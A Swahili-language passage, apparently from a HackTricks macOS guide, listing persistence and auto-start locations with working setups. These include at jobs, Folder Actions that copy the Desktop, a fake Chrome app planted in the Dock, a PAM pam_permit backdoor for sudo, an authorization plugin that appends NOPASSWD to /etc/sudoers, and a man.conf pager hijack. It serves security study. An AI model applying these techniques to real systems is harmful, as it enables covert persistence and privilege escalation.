Kwa **kawaida** zime **zimezuiliwa** lakini mtumiaji **root** anaweza **kuziwezesha** **hizi** kwa:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Hii itaunda faili ndani ya saa 1:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Angalia foleni ya kazi kwa kutumia `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Juu tunaweza kuona kazi mbili zilizopangwa. Tunaweza kuchapisha maelezo ya kazi kwa kutumia `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Ikiwa kazi za AT hazijawashwa, kazi zilizoundwa hazitatekelezwa.

Faili za **job** zinaweza kupatikana katika `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Jina la faili linaelezea foleni, nambari ya kazi, na wakati ilipangwa kufanyika. Kwa mfano, hebu tuangalie `a0001a019bdcd2`.

- `a` - hii ni foleni
- `0001a` - nambari ya kazi katika hex, `0x1a = 26`
- `019bdcd2` - wakati katika hex. Inawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` katika decimal. Ikiwa tutazidisha kwa 60 tunapata `1619509560`, ambayo ni `GMT: 2021. Aprili 27., Jumanne 7:46:00`.

Ikiwa tutachapisha faili la kazi, tunapata kuwa lina taarifa sawa na zile tulizopata kwa kutumia `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Inafaida kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kuwa na uwezo wa kuita `osascript` kwa hoja ili kuwasiliana na **`System Events`** ili uweze kuunda Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ina ruhusa za msingi za TCC kama Desktop, Documents na Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Msingi unahitajika
- **Trigger**: Ufikiaji wa folda iliyoainishwa
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Ufikiaji wa folda iliyoainishwa

#### Description & Exploitation

Folder Actions ni scripts zinazozinduliwa kiotomatiki na mabadiliko katika folda kama kuongeza, kuondoa vitu, au vitendo vingine kama kufungua au kubadilisha ukubwa wa dirisha la folda. Vitendo hivi vinaweza kutumika kwa kazi mbalimbali, na vinaweza kuzinduliwa kwa njia tofauti kama kutumia UI ya Finder au amri za terminal.

Ili kuanzisha Folder Actions, una chaguzi kama:

1. Kuunda mchakato wa Folder Action na [Automator](https://support.apple.com/guide/automator/welcome/mac) na kuisakinisha kama huduma.
2. Kuunganisha script kwa mikono kupitia Folder Actions Setup katika menyu ya muktadha ya folda.
3. Kutumia OSAScript kutuma ujumbe wa Apple Event kwa `System Events.app` kwa kuanzisha Folder Action kwa njia ya programu.
- Njia hii ni muhimu hasa kwa kuingiza kitendo ndani ya mfumo, ikitoa kiwango cha kudumu.

Script ifuatayo ni mfano wa kile kinachoweza kutekelezwa na Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Ili kufanya skripti hapo juu iweze kutumika na Folder Actions, itengeneze kwa kutumia:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Baada ya script kukusanywa, weka Folder Actions kwa kutekeleza script iliyo hapa chini. Script hii itawawezesha Folder Actions kwa ujumla na hasa kuunganisha script iliyokusanywa hapo awali kwenye folda ya Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Kimbia skripti ya usanidi kwa:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Hii ndiyo njia ya kutekeleza hii kudumu kupitia GUI:

Hii ndiyo script itakayotekelezwa:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Tunga kwa: `osacompile -l JavaScript -o folder.scpt source.js`

Hamisha hadi:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Kisha, fungua programu ya `Folder Actions Setup`, chagua **folda unayotaka kufuatilia** na uchague katika kesi yako **`folder.scpt`** (katika kesi yangu niliiita output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sasa, ukifungua folda hiyo na **Finder**, skripti yako itatekelezwa.

Usanidi huu ulihifadhiwa katika **plist** iliyoko katika **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwa muundo wa base64.

Sasa, hebu jaribu kuandaa kudumu hii bila ufikiaji wa GUI:

1. **Nakili `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** hadi `/tmp` ili kuifanya kuwa nakala ya akiba:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Ondoa** Folder Actions ulizoweka hivi karibuni:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Sasa kwamba tuna mazingira tupu

3. Nakili faili ya akiba: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Fungua Folder Actions Setup.app ili kutumia usanidi huu: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Na hii haikufanya kazi kwangu, lakini hizo ndizo maelekezo kutoka kwa andiko:(

### Dock shortcuts

Andiko: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Inafaida kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kuwa na programu mbaya iliyosakinishwa ndani ya mfumo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Wakati mtumiaji anabofya kwenye programu ndani ya dock

#### Maelezo & Ukatili

Programu zote zinazotokea katika Dock zimeainishwa ndani ya plist: **`~/Library/Preferences/com.apple.dock.plist`**

Inawezekana **kuongeza programu** kwa kutumia:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Kwa kutumia baadhi ya **social engineering** unaweza **kujifanya mfano Google Chrome** ndani ya dock na kwa kweli kutekeleza script yako mwenyewe:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Inatumika kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Hatua maalum sana inahitaji kutokea
- Utamalizika katika sandbox nyingine
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Root required
- Trigger: Tumia color picker
- `~/Library/ColorPickers`
- Trigger: Tumia color picker

#### Description & Exploit

**Tengeneza** bundle ya color picker **na msimbo wako** (unaweza kutumia [**hii kwa mfano**](https://github.com/viktorstrate/color-picker-plus)) na ongeza constructor (kama katika [sehemu ya Screen Saver](macos-auto-start-locations.md#screen-saver)) na nakili bundle hiyo kwenye `~/Library/ColorPickers`.

Kisha, wakati color picker itakapoitwa, inapaswa pia kuanzisha yako.

Kumbuka kwamba binary inayopakia maktaba yako ina **sandbox yenye vizuizi vikali sana**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Inatumika kupita sandbox: **Hapana, kwa sababu unahitaji kutekeleza programu yako mwenyewe**
- TCC bypass: ???

#### Location

- Programu maalum

#### Description & Exploit

Mfano wa programu yenye Finder Sync Extension [**inaweza kupatikana hapa**](https://github.com/D00MFist/InSync).

Programu zinaweza kuwa na `Finder Sync Extensions`. Kupanua hii kutakwenda ndani ya programu ambayo itatekelezwa. Zaidi ya hayo, ili kupanua iweze kutekeleza msimbo wake **lazima isainiwe** na cheti halali cha developer wa Apple, lazima iwe **sandboxed** (ingawa visamehe vya kulegeza vinaweza kuongezwa) na lazima iandikishwe na kitu kama:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Inatumika kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini utaishia kwenye sandbox ya programu ya kawaida
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/System/Library/Screen Savers`
- Root required
- **Trigger**: Chagua screen saver
- `/Library/Screen Savers`
- Root required
- **Trigger**: Chagua screen saver
- `~/Library/Screen Savers`
- **Trigger**: Chagua screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Unda mradi mpya katika Xcode na uchague kiolezo cha kuunda **Screen Saver** mpya. Kisha, ongeza msimbo wako kwake, kwa mfano msimbo ufuatao wa kuunda logs.

**Build** it, na nakili bundle ya `.saver` kwenye **`~/Library/Screen Savers`**. Kisha, fungua GUI ya Screen Saver na ukibonyeza tu juu yake, inapaswa kuunda logs nyingi:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Kumbuka kwamba kwa sababu ndani ya ruhusa za binary inayopakia msimbo huu (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) unaweza kupata **`com.apple.security.app-sandbox`** utakuwa **ndani ya sandbox ya programu ya kawaida**.

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Inatumika kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini utaishia kwenye sandbox ya programu
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox inaonekana kuwa na mipaka sana

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Faili mpya yenye kiambatisho kinachosimamiwa na plugin ya spotlight inaundwa.
- `/Library/Spotlight/`
- **Trigger**: Faili mpya yenye kiambatisho kinachosimamiwa na plugin ya spotlight inaundwa.
- Inahitaji root
- `/System/Library/Spotlight/`
- **Trigger**: Faili mpya yenye kiambatisho kinachosimamiwa na plugin ya spotlight inaundwa.
- Inahitaji root
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Faili mpya yenye kiambatisho kinachosimamiwa na plugin ya spotlight inaundwa.
- Inahitaji programu mpya

#### Description & Exploitation

Spotlight ni kipengele cha utafutaji kilichojengwa ndani ya macOS, kilichoundwa kutoa watumiaji **ufikiaji wa haraka na wa kina kwa data kwenye kompyuta zao**.\
Ili kuwezesha uwezo huu wa utafutaji wa haraka, Spotlight inashikilia **hifadhidata ya miliki** na kuunda index kwa **kupitia faili nyingi**, ikiruhusu utafutaji wa haraka kupitia majina ya faili na maudhui yao.

Mekaniki ya msingi ya Spotlight inahusisha mchakato mkuu unaoitwa 'mds', ambayo inasimama kwa **'metadata server'.** Mchakato huu unaratibu huduma nzima ya Spotlight. Kuongeza hii, kuna 'mdworker' daemons wengi wanaofanya kazi mbalimbali za matengenezo, kama vile kuunda index ya aina tofauti za faili (`ps -ef | grep mdworker`). Kazi hizi zinawezekana kupitia plugins za importer za Spotlight, au **".mdimporter bundles**", ambazo zinamwezesha Spotlight kuelewa na kuunda index ya maudhui katika aina mbalimbali za muundo wa faili.

Plugins au **`.mdimporter`** bundles ziko katika maeneo yaliyotajwa hapo awali na ikiwa bundle mpya itaonekana inachukuliwa ndani ya dakika (hakuna haja ya kuanzisha huduma yoyote upya). Bundles hizi zinahitaji kuonyesha ni **aina ya faili na viambatisho gani zinaweza kusimamia**, kwa njia hii, Spotlight itazitumia wakati faili mpya yenye kiambatisho kilichotajwa inaundwa.

Inawezekana **kupata `mdimporters`** zote zilizopakiwa zinazoendesha:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Na kwa mfano **/Library/Spotlight/iBooksAuthor.mdimporter** inatumika kuchambua aina hizi za faili (nyongeza `.iba` na `.book` miongoni mwa zingine):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Ikiwa utachunguza Plist ya `mdimporter` nyingine huenda usipate kipengee **`UTTypeConformsTo`**. Hii ni kwa sababu hiyo ni _Identifaya za Aina za Msingi_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) na haitaji kubainisha nyongeza.
>
> Zaidi ya hayo, plugins za mfumo wa kawaida daima zina kipaumbele, hivyo mshambuliaji anaweza kufikia tu faili ambazo hazijapangwa na `mdimporters` za Apple.

Ili kuunda importer yako mwenyewe unaweza kuanzia na mradi huu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) na kisha kubadilisha jina, **`CFBundleDocumentTypes`** na kuongeza **`UTImportedTypeDeclarations`** ili iweze kusaidia nyongeza unayotaka kusaidia na kuakisi hizo katika **`schema.xml`**.\
Kisha **badilisha** msimbo wa kazi **`GetMetadataForFile`** ili kutekeleza payload yako wakati faili yenye nyongeza iliyoshughulikiwa inaundwa.

Hatimaye **jenga na nakili `.mdimporter` yako mpya** kwenye moja ya maeneo ya hapo awali na unaweza kuangalia ikiwa imepakuliwa **ukifuatilia kumbukumbu** au kuangalia **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> Haionekani kama hii inafanya kazi tena.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Inafaida kwa kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Inahitaji hatua maalum ya mtumiaji
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Haionekani kama hii inafanya kazi tena.

## Root Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **sandbox bypass** ambayo inakuwezesha kutekeleza kitu kwa urahisi kwa **kukiandika kwenye faili** ukiwa **root** na/au kuhitaji hali nyingine **za ajabu.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Inafaida kwa kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Inahitaji root
- **Trigger**: Wakati wakati unafika
- `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local`
- Inahitaji root
- **Trigger**: Wakati wakati unafika

#### Description & Exploitation

Mifumo ya kawaida ya periodic (**`/etc/periodic`**) inatekelezwa kwa sababu ya **launch daemons** zilizowekwa katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Kumbuka kwamba scripts zilizohifadhiwa katika `/etc/periodic/` zina **tekelezwa** kama **mmiliki wa faili,** hivyo hii haitafanya kazi kwa ajili ya kupandisha hadhi.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Kuna skripti nyingine za kipindi ambazo zitatekelezwa zinazoonyeshwa katika **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Ikiwa utaweza kuandika yoyote ya faili `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local` itatekelezwa **mapema au baadaye**.

> [!WARNING]
> Kumbuka kwamba skripti ya kipindi itatekelezwa **kama mmiliki wa skripti**. Hivyo kama mtumiaji wa kawaida ndiye mwenye skripti, itatekelezwa kama mtumiaji huyo (hii inaweza kuzuia mashambulizi ya kupandisha hadhi).

### PAM

Andiko: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Andiko: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Inafaida kwa kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Root daima inahitajika

#### Maelezo & Utekelezaji

Kama PAM inazingatia zaidi **kuendelea** na malware kuliko utekelezaji rahisi ndani ya macOS, blogu hii haitatoa maelezo ya kina, **soma andiko ili kuelewa mbinu hii vizuri zaidi**.

Angalia moduli za PAM kwa:
```bash
ls -l /etc/pam.d
```
Tekniki ya kudumu/kuinua hadhi inayotumia PAM ni rahisi kama kubadilisha moduli /etc/pam.d/sudo kwa kuongeza mstari huu mwanzoni:
```bash
auth       sufficient     pam_permit.so
```
Hivyo itakuwa **inaonekana kama** kitu kama hiki:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Na kwa hivyo, jaribio lolote la kutumia **`sudo` litafanya kazi**.

> [!CAUTION]
> Kumbuka kwamba hii directory inalindwa na TCC hivyo kuna uwezekano mkubwa kwamba mtumiaji atapata ujumbe wa kuomba ruhusa.

Mfano mzuri mwingine ni su, ambapo unaweza kuona kwamba pia inawezekana kutoa vigezo kwa moduli za PAM (na unaweza pia kuweka nyuma ya mlango faili hii):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Inatumika kuzunguka sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na kufanya mipangilio ya ziada
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- Root required
- Pia inahitajika kuunda hifadhidata ya idhini ili kutumia plugin

#### Description & Exploitation

Unaweza kuunda plugin ya idhini ambayo itatekelezwa wakati mtumiaji anapoingia ili kudumisha uthibitisho. Kwa maelezo zaidi kuhusu jinsi ya kuunda moja ya hizi plugins angalia maandiko ya awali (na kuwa makini, moja iliyoandikwa vibaya inaweza kukufunga na utahitaji kusafisha mac yako kutoka kwa hali ya urejelezi).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Hamisha** kifurushi hicho kwenye eneo litakalopakiwa:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Hatimaye ongeza **kanuni** ya kupakia Plugin hii:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** itasema kwa mfumo waidhinishaji kwamba itahitaji **kuita mekanizma ya nje kwa ajili ya idhini**. Zaidi ya hayo, **`privileged`** itafanya itekelezwe na root.

Ishughulishe kwa:
```bash
security authorize com.asdf.asdf
```
Na kisha **kikundi cha wafanyakazi kinapaswa kuwa na sudo** ufikiaji (soma `/etc/sudoers` ili kuthibitisha).

### Man.conf

Andiko: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Inafaida kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na mtumiaji lazima atumie man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/private/etc/man.conf`**
- Root inahitajika
- **`/private/etc/man.conf`**: Wakati wowote man inapotumika

#### Maelezo & Ulaghai

Faili ya usanidi **`/private/etc/man.conf`** inaonyesha binary/script ya kutumia wakati wa kufungua faili za hati za man. Hivyo basi njia ya executable inaweza kubadilishwa ili kila wakati mtumiaji anapotumia man kusoma hati, backdoor inatekelezwa.

Kwa mfano kuweka katika **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Na kisha tengeneza `/tmp/view` kama:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

